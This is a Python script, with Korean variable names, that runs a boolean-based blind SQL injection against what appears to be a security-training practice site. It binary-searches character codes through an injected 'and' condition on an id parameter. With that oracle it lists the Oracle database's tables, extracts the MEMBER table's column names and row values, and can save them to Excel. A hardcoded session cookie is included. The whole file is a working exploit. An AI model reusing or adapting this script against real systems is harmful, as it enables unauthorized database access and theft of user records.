import requests
import pandas as pd
import os

주소 = "https://lab.eqst.co.kr:8110/practice/practice01/detail?id=61"
쿠키 = {
    "JSESSIONID": "53ADE9803F529FAE8705C2553915EA21"
}

def 값찾기(쿼리):
    시작점 = 1
    끝점 = 127
    while 시작점 < 끝점:
        중간점 = int((시작점 + 끝점) / 2)
        공격쿼리 = f"({쿼리}) > {중간점}"
        공격주소 = 주소 + " and " + 공격쿼리
        응답 = requests.get(url=공격주소, cookies=쿠키)
        if "애플워치" in 응답.text:
            시작점 = 중간점 + 1
        else:
            끝점 = 중간점
    return 끝점


# ------------------- 전체 테이블명 추출 -------------------
공격쿼리 = "select count(table_name) from user_tables"
테이블개수 = 값찾기(공격쿼리)
print(f"전체 테이블 개수: {테이블개수}개\n")

전체테이블 = []
for rownum in range(1, 테이블개수 + 1):
    공격쿼리 = f"select length(a) from (select table_name a, rownum b from user_tables) where b={rownum}"
    글자수 = 값찾기(공격쿼리)

    테이블명 = ""
    for substr in range(1, 글자수 + 1):
        공격쿼리 = f"select ascii(substr(a,{substr},1)) from (select table_name a, rownum b from user_tables) where b={rownum}"
        아스키 = 값찾기(공격쿼리)
        테이블명 += chr(아스키)

    전체테이블.append(테이블명)
    print(f"{rownum}번째 테이블명: {테이블명}")

# ------------------- MEMBER 테이블 처리 -------------------
if "MEMBER" in 전체테이블:
    print(f"\n[+] 'MEMBER' 테이블의 컬럼명 추출 중...\n")
    공격쿼리 = "select count(column_name) from user_tab_columns where table_name='MEMBER'"
    컬럼개수 = 값찾기(공격쿼리)
    컬럼목록 = []

    for cnum in range(1, 컬럼개수 + 1):
        공격쿼리 = f"select length(a) from (select column_name a, rownum b from user_tab_columns where table_name='MEMBER') where b={cnum}"
        글자수 = 값찾기(공격쿼리)
        컬럼명 = ""
        for substr in range(1, 글자수 + 1):
            공격쿼리 = f"select ascii(substr(a,{substr},1)) from (select column_name a, rownum b from user_tab_columns where table_name='MEMBER') where b={cnum}"
            아스키 = 값찾기(공격쿼리)
            컬럼명 += chr(아스키)
        컬럼목록.append(컬럼명)
        print(f"{cnum}번째 컬럼명: {컬럼명}")

    # ------------------- 사용자 선택 -------------------
    print("\n[+] 위 컬럼명을 보고 추출할 컬럼명을 쉼표로 구분하여 입력하세요.")
    print(f"예시: {', '.join(컬럼목록[:5])} ...")
    선택컬럼 = input("입력: ").strip().split(",")
    선택컬럼 = [c.strip().upper() for c in 선택컬럼 if c.strip().upper() in 컬럼목록]

    if not 선택컬럼:
        print("선택한 컬럼이 존재하지 않습니다. 프로그램을 종료합니다.")
        exit()

    print(f"\n[+] 선택된 컬럼: {', '.join(선택컬럼)}")
    print(f"[+] MEMBER 테이블의 첫 번째 데이터(rownum=1) 출력\n")
    print(f"TABLE_NAME: MEMBER")

    # ------------------- rownum=1 데이터 출력 -------------------
    데이터 = {}
    for 컬럼 in 선택컬럼:
        공격쿼리 = f"select length({컬럼}) from (select {컬럼}, rownum r from MEMBER) where r=1"
        글자수 = 값찾기(공격쿼리)
        값 = ""
        for substr in range(1, 글자수 + 1):
            공격쿼리 = f"select ascii(substr({컬럼},{substr},1)) from (select {컬럼}, rownum r from MEMBER) where r=1"
            아스키 = 값찾기(공격쿼리)
            값 += chr(아스키)
        데이터[컬럼] = [값]
        print(f"{컬럼}: {값}")

    # ------------------- 엑셀 저장 여부 -------------------
    저장여부 = input("\n엑셀로 저장하시겠습니까? (yes/no): ").strip().lower()
    if 저장여부 == "yes":
        바탕화면경로 = os.path.join(os.path.expanduser("~"), "Desktop", "MEMBER_데이터.xlsx")
        df = pd.DataFrame(데이터)
        with pd.ExcelWriter(바탕화면경로, engine="openpyxl") as writer:
            df.to_excel(writer, index=False, sheet_name="MEMBER")
        print(f"\n엑셀 저장 완료: {바탕화면경로}")
        print("시트 이름: MEMBER")
    else:
        print("\n엑셀 저장하지 않고 종료합니다.")

else:
    print("\nMEMBER 테이블이 존재하지 않습니다.")
